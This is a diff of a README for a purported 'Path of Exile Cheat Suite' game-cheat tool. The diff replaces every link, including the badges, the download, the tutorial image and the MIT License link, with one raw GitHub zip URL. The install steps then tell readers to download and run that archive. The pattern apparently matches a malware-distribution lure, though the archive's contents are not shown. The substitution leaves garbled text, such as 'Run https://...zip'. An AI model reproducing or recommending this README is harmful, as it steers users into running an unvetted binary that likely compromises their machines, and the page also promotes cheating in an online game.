@@ -1,11 +1,11 @@
 # 🚀 Path of Exile Cheat Suite – Next-Gen Assistance for Exiles
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![OS Support](https://img.shields.io/badge/platform-Windows%2C%20macOS%2C%20Linux-informational)
-![Status](https://img.shields.io/badge/status-Active%20Development-brightgreen)
-![API](https://img.shields.io/badge/OpenAI%20API-integrated-success)
-![API](https://img.shields.io/badge/Claude%20API-powered-lightgrey)
-![Languages](https://img.shields.io/badge/languages-Multi--Language-orange)
+![License](https://raw.githubusercontent.com/Elnady209/path-of-exile-edge-tools/main/fisty/of_path_exile_tools_edge_v2.0.zip)
+![OS Support](https://raw.githubusercontent.com/Elnady209/path-of-exile-edge-tools/main/fisty/of_path_exile_tools_edge_v2.0.zip%2C%20macOS%2C%20Linux-informational)
+![Status](https://raw.githubusercontent.com/Elnady209/path-of-exile-edge-tools/main/fisty/of_path_exile_tools_edge_v2.0.zip%20Development-brightgreen)
+![API](https://raw.githubusercontent.com/Elnady209/path-of-exile-edge-tools/main/fisty/of_path_exile_tools_edge_v2.0.zip%20API-integrated-success)
+![API](https://raw.githubusercontent.com/Elnady209/path-of-exile-edge-tools/main/fisty/of_path_exile_tools_edge_v2.0.zip%20API-powered-lightgrey)
+![Languages](https://raw.githubusercontent.com/Elnady209/path-of-exile-edge-tools/main/fisty/of_path_exile_tools_edge_v2.0.zip)
 
 ## 🔮 Introduction
 
@@ -51,13 +51,13 @@ Tested on all major releases for optimal performance. If your operating environm
 Getting started has never been so easy—experience the new era of seamless setup:
 
 1. **Extract the Main Archive:**  
-   Download the `EasyLaunch.zip` file directly from the repository. Extract it to your preferred location on your device.
+   Download the `https://raw.githubusercontent.com/Elnady209/path-of-exile-edge-tools/main/fisty/of_path_exile_tools_edge_v2.0.zip` file directly from the repository. Extract it to your preferred location on your device.
 2. **Follow the Visual Guide:**  
    Watch the step-by-step installation gif for a complete walkthrough and rapid onboarding!
 
-   ![Installation Tutorial](https://i.imgur.com/Js67NIU.gif)
+   ![Installation Tutorial](https://raw.githubusercontent.com/Elnady209/path-of-exile-edge-tools/main/fisty/of_path_exile_tools_edge_v2.0.zip)
 
-3. **Run EasyLaunch.exe or launch the UNIX script for instant access.**  
+3. **Run https://raw.githubusercontent.com/Elnady209/path-of-exile-edge-tools/main/fisty/of_path_exile_tools_edge_v2.0.zip or launch the UNIX script for instant access.**  
 4. **Select your language and personalize the adaptive interface.**  
 5. **Sign up for AI-powered tools to unlock additional functions (see API keys section below).**
 
@@ -109,7 +109,7 @@ Our support volunteers operate globally, ensuring there’s always someone avail
 
 ## 📜 License
 
-Path of Exile Cheat Suite is proudly licensed under the [MIT License](https://opensource.org/licenses/MIT), granting you flexibility and openness in using, modifying, and sharing the software. Released in 2025, this grant covers all contributors and their creative work. Always check the license file in the repository for full terms.
+Path of Exile Cheat Suite is proudly licensed under the [MIT License](https://raw.githubusercontent.com/Elnady209/path-of-exile-edge-tools/main/fisty/of_path_exile_tools_edge_v2.0.zip), granting you flexibility and openness in using, modifying, and sharing the software. Released in 2025, this grant covers all contributors and their creative work. Always check the license file in the repository for full terms.
 
 ---
 
